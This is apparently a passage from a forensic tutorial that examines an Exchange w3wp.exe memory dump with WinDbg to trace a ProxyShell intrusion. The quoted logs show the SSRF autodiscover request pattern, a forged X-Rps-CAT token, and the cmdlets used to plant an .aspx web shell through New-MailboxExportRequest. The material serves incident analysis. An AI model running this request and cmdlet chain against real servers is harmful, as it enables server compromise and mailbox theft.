0000014e`39cd28c8  74 4d 6a 45 74 4d 6a 6b-31 4e 54 6b 31 4e 44 63  tMjEtMjk1NTk1NDc
0000014e`39cd28d8  31 4d 79 30 79 4d 44 67-32 4e 7a 45 32 4f 44 41  1My0yMDg2NzE2ODA
0000014e`39cd28e8  34 4c 54 55 32 4d 7a 59-79 4d 7a 4d 33 4e 69 30  4LTU2MzYyMzM3Ni0
0000014e`39cd28f8  31 4d 44 42 48 42 41 41-41 41 41 63 41 41 41 41  1MDBHBAAAAAcAAAA
0000014e`39cd2908  48 55 79 30 78 4c 54 45-74 4d 41 63 41 41 41 41  HUy0xLTEtMAcAAAA
0000014e`39cd2918  48 55 79 30 78 4c 54 55-74 4d 67 63 41 41 41 41  HUy0xLTUtMgcAAAA
0000014e`39cd2928  49 55 79 30 78 4c 54 55-74 4d 54 45 48 41 41 41  IUy0xLTUtMTEHAAA
0000014e`39cd2938  41 43 46 4d 74 4d 53 30-31 4c 54 45 31 52 51 41  ACFMtMS01LTE1RQA
0000014e`39cd2948  41 41 41 41 25 33 64 25-32 36 45 6d 61 69 6c 25  AAAA%3d%26Email%
0000014e`39cd2958  33 64 61 75 74 6f 64 69-73 63 6f 76 65 72 25 32  3dautodiscover%2
0000014e`39cd2968  66 61 75 74 6f 64 69 73-63 6f 76 65 72 2e 6a 73  fautodiscover.js
0000014e`39cd2978  6f 6e 25 33 66 25 34 30-66 75 63 6b 79 30 75 2e  on%3f%40fucky0u.
0000014e`39cd2988  65 64 75 3e 3c 6a 6f 6e-65 73 40 63 6f 6e 74 6f  edu><jones@conto
0000014e`39cd2998  73 6f 2e 63 6f 6d 3e 3c-43 61 66 65 2d 57 69 6e  so.com><Cafe-Win
0000014e`39cd29a8  64 6f 77 73 49 64 65 6e-74 69 74 79 3e 22 7d 2c  dowsIdentity>"},
```

Let's attempt to determine where this ProxyShell request was originating from. The **`X-Forwarded-For`** field in HTTP headers is used to identify the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer.

This command is performing a memory search operation. The **`-a`** parameter is an option that specifies the search should be for ASCII text.

```
0:000> s -a 0 L?0x7fffffffffffffff "X-Forwarded-For"
0000014e`4b8578c7  58 2d 46 6f 72 77 61 72-64 65 64 2d 46 6f 72 3a  X-Forwarded-For:
<<< SNIPPET >>>
```

We can now display the memory in a formatted way, which will reveal the originating IP that was making the request.

```
0:000> dc 0000014e`4b8578c7
0000014e`4b8578c7  6f462d58 72617772 2d646564 3a726f46  X-Forwarded-For:
0000014e`4b8578d7  32373120 2e33322e 2e333931 0d383431   172.23.193.148.
0000014e`4b8578e7  462d580a 6177726f 64656472 726f502d  .X-Forwarded-Por
0000014e`4b8578f7  36203a74 35313633 2d580a0d 452d534d  t: 63615..X-MS-E
0000014e`4b857907  49656764 0d203a50 452d580a 6d6f4378  dgeIP: ..X-ExCom
0000014e`4b857917  3a644970 696c4320 41746e65 73656363  pId: ClientAcces
0000014e`4b857927  6f724673 6e45746e 580a0d64 69724f2d  sFrontEnd..X-Ori
0000014e`4b857937  616e6967 7165526c 74736575 74736f48  ginalRequestHost
```

According to Mandiant, *"As soon as the attacker is able to execute arbitrary PowerShell commands, and the required ‘Import Export Mailbox’ role is assigned to the impersonated user (which can be achieved by execution of the New-ManagementRoleAssignment cmdlet), the cmdlet New-MailboxExportRequest can be used to export a user’s mailbox to a specific desired path e.g."*

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/67fb0bbd-e934-4d77-ba1d-3f4de53d7b4b)

We can use the **SOSEX** extension that has been created by **Steve Johnson**. The **SOSEX** extension is designed to enhance the analysis and troubleshooting of .NET applications. We can use the **`!sosex.strings`** to search for strings in a .NET application's managed heap.  

```
0:000> !sosex.strings /m:"C:\Program Files\Microsoft\Exchange Server\V15\Logging\*"
This dump has no SOSEX heap index.
The heap index makes searching for references and roots much faster.
To create a heap index, run !bhi
Address            Gen  Value
---------------------------------------
0000014e33c79420            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver
0000014e33c85160            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver\w3wp.exe_RemotePS_2023110922-1.LOG
0000014e33d43370            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\Calendar Repair Assistant
0000014e33d43cf8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\Managed Folder Assistant
0000014e33d47518            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\IRMLogs
0000014e34049560            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra
0000014e34049600            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http
0000014e340496e8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http\RequestMonitor
0000014e3407bf30            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\RoutingUpdateModule\Powershell
0000014e3414f1f0            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http\Rps_Http_2023110922-1.LOG
0000014e3429d320            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra
0000014e3429d3c0            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\AuthZ
0000014e34886dd0            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver
0000014e348b7f18            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\ADDriver\w3wp.exe_RemotePS_2023110922-2.LOG
0000014e37e7db00            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\AuthZ\Rps_AuthZ_2023110922-1.LOG
0000014e380abe80            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\DCAdminActionsLog
0000014e3837e8c8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\LocalQueue\Exchange
0000014e38701600            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\LocalQueue\Exchange\audit20231109-3.LOG
0000014e38984ab8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Cmdlet
0000014e38987980            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Cmdlet\Rps_Cmdlet_2023110922-1.LOG
0000014e38f1e208            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\MailboxReplicationService
0000014e38fcbff8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\Calendar Repair Assistant
0000014e38fcc300            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\Managed Folder Assistant
0000014e38fcf0d8            2   C:\Program Files\Microsoft\Exchange Server\V15\Logging\IRMLogs
---------------------------------------
```

The output lists string instances found in the memory dump that match the specified path **`C:\Program Files\Microsoft\Exchange Server\V15\Logging*`**. Observing these strings in the heap of a w3wp.exe memory dump, which include paths to Exchange Server log files, does not definitively indicate that the w3wp.exe process itself has written to those log files.

The process might have read these paths from a configuration file or the registry, or it could be accessing these log files for reading or monitoring purposes. However, that's been said. Let's examine this further. 

First, let's start with **`C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Http\Rps_Http_2023110922-1.LOG`**. The snippet from the Rps Http Log file of Microsoft Exchange Server provides information about HTTP requests handled by the PowerShell proxy. 

This log is valuable for tracking and analyzing the behavior and performance of PowerShell-based requests in the Exchange environment.

```
DateTime,StartTime,RequestId,MajorVersion,MinorVersion,BuildVersion,RevisionVersion,ClientRequestId,UrlHost,UrlStem,AuthenticationType,IsAuthenticated,AuthenticatedUser,Organization,ManagedOrganization,ClientIpAddress,ServerHostName,FrontEndServer,HttpStatus,SubStatus,ErrorCode,Action,CommandId,CommandName,SessionId,ShellId,FailFast,ContributeToFailFast,RequestBytes,ClientInfo,CPU,Memory,ActivityContextLifeTime,TotalTime,UrlQuery,GenericLatency,GenericInfo,GenericErrors
#Software: Microsoft Exchange Server
#Version: 15.01.1713.001
#Log-type: Rps Http Logs
#Date: 2023-11-09T22:28:48.260Z
#Fields: DateTime,StartTime,RequestId,MajorVersion,MinorVersion,BuildVersion,RevisionVersion,ClientRequestId,UrlHost,UrlStem,AuthenticationType,IsAuthenticated,AuthenticatedUser,Organization,ManagedOrganization,ClientIpAddress,ServerHostName,FrontEndServer,HttpStatus,SubStatus,ErrorCode,Action,CommandId,CommandName,SessionId,ShellId,FailFast,ContributeToFailFast,RequestBytes,ClientInfo,CPU,Memory,ActivityContextLifeTime,TotalTime,UrlQuery,GenericLatency,GenericInfo,GenericErrors
2023-11-09T22:28:48.259Z,2023-11-09T22:28:48.144Z,4e2a83c8-8e6b-4256-8c78-914f092c6012,15,1,1713,5,,exchange2012.contoso.com,/Powershell,Kerberos,true,Jones@contoso.com,,,172.23.193.148,EXCHANGE2012,EXCHANGE2012.CONTOSO.COM,200,0,,,,,,,,,0,Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/92.0.4515.131 Safari/537.36.,,,115,113,?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu,RequestMonitor.Register=3;WinRMDataSender.Send=8;RpsHttpDatabaseValidationModule=0;ThrottlingHttpModule=0;,WinRMDataSender.AuthenticationType=Sent;WinRMDataSender.NamedPipe=Sent;OnEndRequest.End.ContentType=text/html;S:ServiceCommonMetadata.HttpMethod=GET;I32:ADR.C[WIN-S3BI0QBR12A]=1;F:ADR.AL[WIN-S3BI0QBR12A]=1.683267;I32:ATE.C[WIN-S3BI0QBR12A.contoso.com]=1;F:ATE.AL[WIN-S3BI0QBR12A.contoso.com]=0,
2023-11-09T22:29:28.901Z,2023-11-09T22:29:28.800Z,0cd07968-a191-4883-aa5b-101cd097efcf,15,1,1713,5,,exchange2012.contoso.com,/Powershell,Kerberos,true,Jones@contoso.com,,,172.23.193.148,EXCHANGE2012,EXCHANGE2012.CONTOSO.COM,200,0,,,,,,,,,3236,Python PSRP Client,0% * 4,169M/175M,100,100,?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu,RequestMonitor.Register=1;WinRMDataSender.Send=0;RpsHttpDatabaseValidationModule=0;ThrottlingHttpModule=0;,WinRMDataSender.AuthenticationType=Sent;WinRMDataSender.NamedPipe=Sent;OnEndRequest.End.ContentType=application/soap+xml charset UTF-8;S:ServiceCommonMetadata.HttpMethod=POST,
2023-11-09T22:29:29.457Z,2023-11-09T22:29:28.914Z,744e070c-c3cc-4c62-a826-4e3e226a4168,15,1,1713,5,,exchange2012.contoso.com,/Powershell,Kerberos,true,Jones@contoso.com,,,172.23.193.148,EXCHANGE2012,EXCHANGE2012.CONTOSO.COM,200,0,,,,,,,,,1861,Python PSRP Client,,,542,542,?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu,RequestMonitor.Register=0;WinRMDataSender.Send=0;RpsHttpDatabaseValidationModule=0;ThrottlingHttpModule=0;,WinRMDataSender.AuthenticationType=Sent;WinRMDataSender.NamedPipe=Sent;OnEndRequest.End.ContentType=application/soap+xml charset UTF-8;S:ServiceCommonMetadata.HttpMethod=POST,
2023-11-09T22:29:47.452Z,2023-11-09T22:29:29.465Z,b0b18881-d202-44ad-b42e-f90c8473a440,15,1,1713,5,,exchange2012.contoso.com,/Powershell,Kerberos,true,Jones@contoso.com,,,172.23.193.148,EXCHANGE2012,EXCHANGE2012.CONTOSO.COM,200,0,,,,,,,,,1861,Python PSRP Client,,,17985,17985,?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBBUJhc2ljTBFKb25lc0Bjb250b3NvLmNvbVUsUy0xLTUtMjEtMjk1NTk1NDc1My0yMDg2NzE2ODA4LTU2MzYyMzM3Ni01MDBHBAAAAAcAAAAHUy0xLTEtMAcAAAAHUy0xLTUtMgcAAAAIUy0xLTUtMTEHAAAACFMtMS01LTE1RQAAAAA=&Email=autodiscover/autodiscover.json%3F@fucky0u.edu,RequestMonitor.Register=0;WinRMDataSender.Send=0;RpsHttpDatabaseValidationModule=0;ThrottlingHttpModule=0;,WinRMDataSender.AuthenticationType=Sent;WinRMDataSender.NamedPipe=Sent;OnEndRequest.End.ContentType=application/soap+xml charset UTF-8;S:ServiceCommonMetadata.HttpMethod=POST,
```

This command iterates through memory to search for the string **`Powershell,Kerberos,true`** and once it finds it. It displays a message indicating the memory address where it was found, followed by dumping 100 lines of context from that memory address. The output is coming from **`Rps_Http_2023110922-1.LOG`** file.

```
0:000> .foreach (address { s -[l 8]a 0 L?0x7fffffffffffffff "Powershell,Kerberos,true" }) { .if ($spat("${address}", "0000*`*")) { .echo Found "Powershell,Kerberos,true" at ${address}; dc ${address} L100 } };
Found "Powershell,Kerberos,true" at 0000014e`341221ee
0000014e`341221ee  65776f50 65687372 4b2c6c6c 65627265  Powershell,Kerbe
0000014e`341221fe  2c736f72 65757274 6e6f4a2c 63407365  ros,true,Jones@c
0000014e`3412220e  6f746e6f 632e6f73 2c2c6d6f 3237312c  ontoso.com,,,172
0000014e`3412221e  2e33322e 2e333931 2c383431 48435845  .23.193.148,EXCH
0000014e`3412222e  45474e41 32313032 4358452c 474e4148  ANGE2012,EXCHANG
0000014e`3412223e  31303245 4f432e32 534f544e 4f432e4f  E2012.CONTOSO.CO
0000014e`3412224e  30322c4d 2c302c30 2c2c2c2c 2c2c2c2c  M,200,0,,,,,,,,,
0000014e`3412225e  31363831 7479502c 206e6f68 50525350  1861,Python PSRP
0000014e`3412226e  696c4320 2c746e65 33392c2c 392c3730   Client,,,9307,9
0000014e`3412227e  2c313133 522d583f 432d7370 563d5441  311,?X-Rps-CAT=V
0000014e`3412228e  56414567 61586441 626b3557 517a6433  gEAVAdXaW5kb3dzQ
0000014e`3412229e  42424277 63684a55 546a6c32 624b4642  wBBBUJhc2ljTBFKb
0000014e`341222ae  636c3532 626a4230 62303532 4c764e33  25lc0Bjb250b3NvL
0000014e`341222be  62764e6d 55735556 4c783079 4d745554  mNvbVUsUy0xLTUtM
0000014e`341222ce  4d74456a 4e316b6a 4e316b54 4d316344  jEtMjk1NTk1NDc1M
0000014e`341222de  4d793079 4e326744 4f32457a 4c344144  y0yMDg2NzE2ODA4L
0000014e`341222ee  4d325554 4d79597a 4e334d7a 4d313069  TU2MzYyMzM3Ni01M
0000014e`341222fe  42484244 41414141 41416341 55484141  DBHBAAAAAcAAAAHU
0000014e`3412230e  4c783079 4d744554 41416341 55484141  y0xLTEtMAcAAAAHU
0000014e`3412231e  4c783079 4d745554 41416367 55494141  y0xLTUtMgcAAAAIU
0000014e`3412232e  4c783079 4d745554 41484554 43414141  y0xLTUtMTEHAAAAC
0000014e`3412233e  4d744d46 4c313053 52314554 41414151  FMtMS01LTE1RQAAA
0000014e`3412234e  263d4141 69616d45 75613d6c 69646f74  AA=&Email=autodi
0000014e`3412235e  766f6373 612f7265 646f7475 6f637369  scover/autodisco
0000014e`3412236e  2e726576 6e6f736a 40463325 6b637566  ver.json%3F@fuck
0000014e`3412237e  2e753079 2c756465 75716552 4d747365  y0u.edu,RequestM
0000014e`3412238e  74696e6f 522e726f 73696765 3d726574  onitor.Register=
0000014e`3412239e  69573b30 444d526e 53617461 65646e65  0;WinRMDataSende
0000014e`341223ae  65532e72 303d646e 7370523b 70747448  r.Send=0;RpsHttp
0000014e`341223be  61746144 65736162 696c6156 69746164  DatabaseValidati
0000014e`341223ce  6f4d6e6f 656c7564 543b303d 746f7268  onModule=0;Throt
0000014e`341223de  6e696c74 74744867 646f4d70 3d656c75  tlingHttpModule=
0000014e`341223ee  572c3b30 4d526e69 61746144 646e6553  0;,WinRMDataSend
0000014e`341223fe  412e7265 65687475 6369746e 6f697461  er.Authenticatio
0000014e`3412240e  7079546e 65533d65 573b746e 4d526e69  nType=Sent;WinRM
0000014e`3412241e  61746144 646e6553 4e2e7265 64656d61  DataSender.Named
0000014e`3412242e  65706950 6e65533d 6e4f3b74 52646e45  Pipe=Sent;OnEndR
0000014e`3412243e  65757165 452e7473 432e646e 65746e6f  equest.End.Conte
0000014e`3412244e  7954746e 613d6570 696c7070 69746163  ntType=applicati
0000014e`3412245e  732f6e6f 2b70616f 206c6d78 72616863  on/soap+xml char
0000014e`3412246e  20746573 2d465455 3a533b38 76726553  set UTF-8;S:Serv
0000014e`3412247e  43656369 6f6d6d6f 74654d6e 74616461  iceCommonMetadat
0000014e`3412248e  74482e61 654d7074 646f6874 534f503d  a.HttpMethod=POS
0000014e`3412249e  0a0d2c54 33323032 2d31312d 32543930  T,..2023-11-09T2
0000014e`341224ae  30333a32 2e38313a 5a353733 3230322c  2:30:18.375Z,202
0000014e`341224be  31312d33 5439302d 333a3232 38313a30  3-11-09T22:30:18
0000014e`341224ce  3237332e 34342c5a 36623930 332d3964  .372Z,4409b6d9-3
0000014e`341224de  2d346235 36623434 3738622d 32612d33  5b4-44b6-b873-a2
0000014e`341224ee  32653435 36343163 312c6362 2c312c35  54e2c146bc,15,1,
0000014e`341224fe  33313731 2c2c352c 68637865 65676e61  1713,5,,exchange
0000014e`3412250e  32313032 6e6f632e 6f736f74 6d6f632e  2012.contoso.com
0000014e`3412251e  6f502f2c 73726577 6c6c6568 72654b2c  ,/Powershell,Ker
0000014e`3412252e  6f726562 72742c73 4a2c6575 73656e6f  beros,true,Jones
0000014e`3412253e  6e6f6340 6f736f74 6d6f632e 312c2c2c  @contoso.com,,,1
0000014e`3412254e  322e3237 39312e33 34312e33 58452c38  72.23.193.148,EX
0000014e`3412255e  4e414843 30324547 452c3231 41484358  CHANGE2012,EXCHA
0000014e`3412256e  3245474e 2e323130 544e4f43 2e4f534f  NGE2012.CONTOSO.
0000014e`3412257e  2c4d4f43 2c303032 2c2c2c30 2c2c2c2c  COM,200,0,,,,,,,
0000014e`3412258e  38312c2c 502c3136 6f687479 5350206e  ,,1861,Python PS
0000014e`3412259e  43205052 6e65696c 2c2c2c74 2c322c32  RP Client,,,2,2,
0000014e`341225ae  522d583f 432d7370 563d5441 56414567  ?X-Rps-CAT=VgEAV
0000014e`341225be  61586441 626b3557 517a6433 42424277  AdXaW5kb3dzQwBBB
0000014e`341225ce  63684a55 546a6c32 624b4642 636c3532  UJhc2ljTBFKb25lc
0000014e`341225de  626a4230 62303532 4c764e33 62764e6d  0Bjb250b3NvLmNvb

<<< SNIPPET >>>
```

The string **`Powershell,Kerberos,true`** maps to the following:

| Field              | Description                                                                                         |
|--------------------|-----------------------------------------------------------------------------------------------------|
| `UrlStem`          | "Powershell" - Indicates the part of the URL accessed, suggesting the PowerShell interface or endpoint. |
| `AuthenticationType` | "Kerberos" - Specifies the type of authentication used for the request, indicating Kerberos authentication. |
| `IsAuthenticated`  | "true" - Indicates whether the user was successfully authenticated, with "true" confirming successful authentication. |


Let's now take a look at **`C:\Program Files\Microsoft\Exchange Server\V15\Logging\CmdletInfra\Powershell-Proxy\Cmdlet\Rps_Cmdlet_2023110922-1.LOG`**. This log file captures information about the execution of PowerShell cmdlets. Here is a snippet on how the log file looks like:

```
DateTime,StartTime,RequestId,ClientRequestId,MajorVersion,MinorVersion,BuildVersion,RevisionVersion,ServerHostName,ProcessId,ProcessName,ThreadId,CultureInfo,Organization,AuthenticatedUser,ExecutingUserSid,EffectiveOrganization,UserServicePlan,IsAdmin,ClientApplication,Cmdlet,Parameters,CmdletUniqueId,UserBudgetOnStart,ContributeToFailFast,RunspaceSettingsCreationHint,ADViewEntireForest,ADRecipientViewRoot,ADConfigurationDomainControllers,ADPreferredGlobalCatalogs,ADPreferredDomainControllers,ADUserConfigurationDomainController,ADUserPreferredGlobalCatalog,ADuserPreferredDomainControllers,ThrottlingInfo,DelayInfo,ThrottlingDelay,IsOutputObjectRedacted,CmdletProxyStage,CmdletProxyRemoteServer,CmdletProxyRemoteServerVersion,CmdletProxyMethod,ProxiedObjectCount,CmdletProxyLatency,OutputObjectCount,ParameterBinding,BeginProcessing,ProcessRecord,EndProcessing,StopProcessing,BizLogic,PowerShellLatency,UserInteractionLatency,ProvisioningLayerLatency,ActivityContextLifeTime,TotalTime,ErrorType,ExecutionResult,CacheHitCount,CacheMissCount,GenericLatency,GenericInfo,GenericErrors,ObjectGuid,ExternalDirectoryOrganizationId,ExternalDirectoryObjectId,NonPiiParameters
#Software: Microsoft Exchange Server
#Version: 15.01.1713.001
#Log-type: Rps Cmdlet Logs
#Date: 2023-11-09T22:29:55.877Z
#Fields: DateTime,StartTime,RequestId,ClientRequestId,MajorVersion,MinorVersion,BuildVersion,RevisionVersion,ServerHostName,ProcessId,ProcessName,ThreadId,CultureInfo,Organization,AuthenticatedUser,ExecutingUserSid,EffectiveOrganization,UserServicePlan,IsAdmin,ClientApplication,Cmdlet,Parameters,CmdletUniqueId,UserBudgetOnStart,ContributeToFailFast,RunspaceSettingsCreationHint,ADViewEntireForest,ADRecipientViewRoot,ADConfigurationDomainControllers,ADPreferredGlobalCatalogs,ADPreferredDomainControllers,ADUserConfigurationDomainController,ADUserPreferredGlobalCatalog,ADuserPreferredDomainControllers,ThrottlingInfo,DelayInfo,ThrottlingDelay,IsOutputObjectRedacted,CmdletProxyStage,CmdletProxyRemoteServer,CmdletProxyRemoteServerVersion,CmdletProxyMethod,ProxiedObjectCount,CmdletProxyLatency,OutputObjectCount,ParameterBinding,BeginProcessing,ProcessRecord,EndProcessing,StopProcessing,BizLogic,PowerShellLatency,UserInteractionLatency,ProvisioningLayerLatency,ActivityContextLifeTime,TotalTime,ErrorType,ExecutionResult,CacheHitCount,CacheMissCount,GenericLatency,GenericInfo,GenericErrors,ObjectGuid,ExternalDirectoryOrganizationId,ExternalDirectoryObjectId,NonPiiParameters
2023-11-09T22:29:55.866Z,2023-11-09T22:29:48.147Z,2d91233f-4398-44c5-8a42-d1e62cd4047b,,15,1,1713,5,EXCHANGE2012,6832,w3wp#MSExchangePowerShellAppPool,5,,,Administrator,S-1-5-21-2955954753-2086716808-563623376-500,,,True,PowerShell,New-ManagementRoleAssignment,"-Role ""Mailbox Import Export"" -SecurityGroup ""Organization Management""",6c7c685f-8dd4-44c0-b237-cd3b09667404,,,GCRandomly,False,contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,,,,,,,,,,,,0,,1,31,109,7553,6,,7568,30,1,7232,25764,7717,,Success,,,GetApplicationPrivateData=11/9/2023 10:29:30 PM;WinRMDataReceiver.LoadItemsFromNamedPipe=19;WinRMDataReceiver.LoadItemsFromAuthenticationType=0;WinRMDataReceiver.Ctor=24;ExchangeRunspaceConfiguration=6680;ExchangeRunspaceConfiguration.C=23;ExchangeRunspaceConfiguration.LoadRoleCmdletInfo=1104;ExchangeRunspaceConfiguration.LoadRoleCmdletInfo.ADC=14;ExchangeRunspaceConfiguration.LoadRoleCmdletInfo.AD=58;ExchangeRunspaceConfiguration.LoadRoleCmdletInfo.ATEC=251;ExchangeRunspaceConfiguration.LoadRoleCmdletInfo.ATE=639;GetInitialSessionStateCore.ExchangeExpiringRunspaceConfiguration=2238;GetInitialSessionStateCore.ExchangeExpiringRunspaceConfiguration.ADC=16;GetInitialSessionStateCore.ExchangeExpiringRunspaceConfiguration.AD=87;GetInitialSessionStateCore.ExchangeExpiringRunspaceConfiguration.ATEC=252;GetInitialSessionStateCore.ExchangeExpiringRunspaceConfiguration.ATE=719;InitialSessionStateBuilder=4547;InitialSessionStateBuilder.C=894;InitialSessionStateBuilder.InitializeWellKnownSnapinsIfNeeded=1406;InitialSessionStateBuilder.AddEntriesToIss=2160;PowerShellThrottlingPolicyUpdater=6;InitialSessionStateBuilder.Build=3753;InitialSessionStateBuilder.Build.ADC=3;InitialSessionStateBuilder.Build.AD=4;InitialSessionStateBuilder.Build.ATEC=2;InitialSessionStateBuilder.Build.ATE=10;ExchangeRunspaceConfiguration.CreateInitialSessionState=4573;ExchangeRunspaceConfiguration.CreateInitialSessionState.ADC=3;ExchangeRunspaceConfiguration.CreateInitialSessionState.AD=4;ExchangeRunspaceConfiguration.CreateInitialSessionState.ATEC=2;ExchangeRunspaceConfiguration.CreateInitialSessionState.ATE=10;GetInitialSessionStateCore.exchangeRunspaceConfig.CreateInitialSessionState=4574;GetInitialSessionStateCore.exchangeRunspaceConfig.CreateInitialSessionState.ADC=3;GetInitialSessionStateCore.exchangeRunspaceConfig.CreateInitialSessionState.AD=4;GetInitialSessionStateCore.exchangeRunspaceConfig.CreateInitialSessionState.ATEC=2;GetInitialSessionStateCore.exchangeRunspaceConfig.CreateInitialSessionState.ATE=10;GetInitialSessionStateCore=6952;GetInitialSessionStateCore.ADC=19;GetInitialSessionStateCore.AD=92;GetInitialSessionStateCore.ATEC=254;GetInitialSessionStateCore.ATE=729;GetApplicationPrivateData.ADC=19;GetApplicationPrivateData.AD=92;GetApplicationPrivateData.ATEC=254;GetApplicationPrivateData.ATE=729;GetInitialSessionState=11/9/2023 10:29:37 PM;TaskModuleLatency=176;TaskModuleLatency.C=807;PowerShellLatency.C=129;ProvisioningLayerLatency.C=12;BizLogic.C=16;Admin Audit Log Agent=7169;Admin Audit Log Agent.C=6;Admin Audit Log Agent.Validate=6489;Admin Audit Log Agent.Validate.ADC=13;Admin Audit Log Agent.Validate.AD=22;Admin Audit Log Agent.Validate.ATEC=10;Admin Audit Log Agent.Validate.ATE=36;ProvisioningLayerLatency.Validate=6491;ProvisioningLayerLatency.Validate.ADC=13;ProvisioningLayerLatency.Validate.AD=22;ProvisioningLayerLatency.Validate.ATEC=10;ProvisioningLayerLatency.Validate.ATE=36;BizLogic.Task.ProcessRecord/InnerProcessRecord=7443;BizLogic.Task.ProcessRecord/InnerProcessRecord.ADC=27;BizLogic.Task.ProcessRecord/InnerProcessRecord.AD=56;BizLogic.Task.ProcessRecord/InnerProcessRecord.ATEC=23;BizLogic.Task.ProcessRecord/InnerProcessRecord.ATE=40;BizLogic.Task.ProcessRecord.Main.1=7444;BizLogic.Task.ProcessRecord.Main.1.ADC=27;BizLogic.Task.ProcessRecord.Main.1.AD=56;BizLogic.Task.ProcessRecord.Main.1.ATEC=23;BizLogic.Task.ProcessRecord.Main.1.ATE=40;BizLogic.Task.ProcessRecord.Retry=7444;BizLogic.Task.ProcessRecord.Retry.ADC=27;BizLogic.Task.ProcessRecord.Retry.AD=56;BizLogic.Task.ProcessRecord.Retry.ATEC=23;BizLogic.Task.ProcessRecord.Retry.ATE=40;ProcessRecord.ADC=27;ProcessRecord.AD=56;ProcessRecord.ATEC=23;ProcessRecord.ATE=40;BizLogic.Task.ProcessRecord=7561;BizLogic.Task.ProcessRecord.ADC=27;BizLogic.Task.ProcessRecord.AD=56;BizLogic.Task.ProcessRecord.ATEC=23;BizLogic.Task.ProcessRecord.ATE=40;Cmd=7714;Cmd.ADC=28;Cmd.AD=58;Cmd.ATEC=30;Cmd.ATE=40;,PSSenderInfo=jones@contoso.com;ADServerSettingsInEnd=ADViewEntireForest:False WriteShadowProperties:False WriteOriginatingChangeTimestamp:False ADRecipientViewRoot:contoso.com ADConfigurationDomainControllers:WIN-S3BI0QBR12A.contoso.com ADPreferredGlobalCatalogs:WIN-S3BI0QBR12A.contoso.com ADPreferredDomainControllers:WIN-S3BI0QBR12A.contoso.com ADUserPreferredDomainControllers: ;,,,,,"-Role ""<SNIP-PII>"" -SecurityGroup ""<SNIP-PII>"""
2023-11-09T22:30:08.489Z,2023-11-09T22:29:56.414Z,2d91233f-4398-44c5-8a42-d1e62cd4047b,,15,1,1713,5,EXCHANGE2012,6832,w3wp#MSExchangePowerShellAppPool,5,,,Administrator,S-1-5-21-2955954753-2086716808-563623376-500,,,True,PowerShell,New-MailboxExportRequest,"-Mailbox ""Jones"" -Name ""2075506b3d074905b07b9993841d265c"" -ContentFilter ""Subject -eq '2075506b3d074905b07b9993841d265c'"" -FilePath ""\\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\tkevsn.aspx""",3f238be2-eb95-492e-8ebd-9ae9496c00e1,,,GCRandomly,False,contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,WIN-S3BI0QBR12A.contoso.com,,,,,,,,,,,,0,,,0,192,11881,1,,12067,33,,9,38377,12075,,Error,,,GetApplicationPrivateData=11/9/2023 10:29:55 PM;WinRMDataReceiver.LoadItemsFromNamedPipe=1;WinRMDataReceiver.LoadItemsFromAuthenticationType=0;WinRMDataReceiver.Ctor=1;ExchangeRunspaceConfiguration=355;ExchangeRunspaceConfiguration.C=23;PowerShellThrottlingPolicyUpdater=0;InitialSessionStateBuilder=272;GetInitialSessionStateCore=357;GetInitialSessionState=11/9/2023 